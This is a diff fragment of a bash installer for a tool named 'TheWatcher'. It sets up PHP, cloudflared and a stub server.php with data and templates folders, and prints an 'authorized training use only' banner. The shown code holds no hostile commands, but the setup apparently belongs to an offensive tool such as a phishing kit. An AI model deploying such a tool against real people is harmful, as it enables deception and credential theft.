-    
-    mkdir -p "$INSTALL_DIR"
-    cd "$INSTALL_DIR"
-    
-    install_python_deps
-    install_php
-    install_cloudflared
-    create_files
-    
-    echo ""
-    echo -e "${GREEN}${BOLD}╔═══════════════════════════════════════════════════════════════╗${END}"
-    echo -e "${GREEN}${BOLD}║                    ✅ INSTALLATION COMPLETE!                    ║${END}"
-    echo -e "${GREEN}${BOLD}╚═══════════════════════════════════════════════════════════════╝${END}"
-    echo ""
-    echo -e "${CYAN}🚀 START TheWatcher:${END}"
-    echo -e "  ${YELLOW}cd $INSTALL_DIR && python3 thewatcher.py${END}"
-    echo ""
-    echo ""
-    echo -e "${RED}${BOLD}⚠️  AUTHORIZED TRAINING USE ONLY${END}"
-    echo ""
-}
+# Create server.php if missing
+if [[ ! -f "server.php" ]]; then
+    cat > server.php << 'EOF'
+<?php
+if (!is_dir('data')) mkdir('data',0755,true);
+if (!is_dir('templates')) mkdir('templates',0755,true);
+echo "TheWatcher Server Ready";
+?>
+EOF
+    print_success "Created server.php"
+fi
 
-# Run main
-main "$@"
+echo ""
+echo -e "${GREEN}${BOLD}╔═══════════════════════════════════════════════════════════════╗${END}"
+echo -e "${GREEN}${BOLD}║                    ✅ INSTALLATION COMPLETE!                    ║${END}"
+echo -e "${GREEN}${BOLD}╚═══════════════════════════════════════════════════════════════╝${END}"
+echo ""
+echo -e "${CYAN}🚀 TO START THEWATCHER:${END}"
+echo -e "  ${YELLOW}python3 thewatcher.py${END}"
+echo ""
+echo -e "${CYAN}📁 Files installed in: ${YELLOW}$(pwd)${END}"
+echo ""
+echo -e "${RED}${BOLD}⚠️  AUTHORIZED TRAINING USE ONLY${END}"
+echo ""
